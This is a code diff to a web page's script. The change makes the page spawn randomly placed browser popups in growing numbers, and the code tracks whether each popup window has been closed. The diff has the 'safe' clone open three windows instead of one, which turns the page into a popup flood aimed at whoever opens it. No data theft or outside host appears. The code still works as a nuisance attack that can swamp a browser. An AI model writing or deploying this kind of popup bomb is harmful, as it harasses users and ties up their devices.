@@ -12,8 +12,8 @@
     <script>
         window.plsclose = 'no'
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
-        function openNew() {
-            var popup = window.open(window.location.href + '?popup=popup', '', 'top=' + (Math.floor(Math.random() * 900) + 100) + ',left=' + (Math.floor(Math.random() * 900) + 100) + ',width=350,height=250');
+        function openNew(input = 'popup') {
+            var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + (Math.floor(Math.random() * 900) + 100) + ',left=' + (Math.floor(Math.random() * 900) + 100) + ',width=350,height=250');
 
             var popupTick = setInterval(function () {
                 if (popup.closed) {
@@ -30,9 +30,11 @@
         }
 
         if (window.clone === 'main') {
-            window.open(window.location.href + '?popup=safe', '', 'width=1,height=1')
+            openNew('safe')
         } else if (window.clone === 'safe') {
             document.querySelector('.icon').innerHTML = ''
+            openNew()
+            openNew()
             openNew()
         }
     </script>
@@ -40,6 +42,7 @@
         body {
             display: grid;
             place-items: center;
+            text-align: center;
         }
     </style>
 </body>
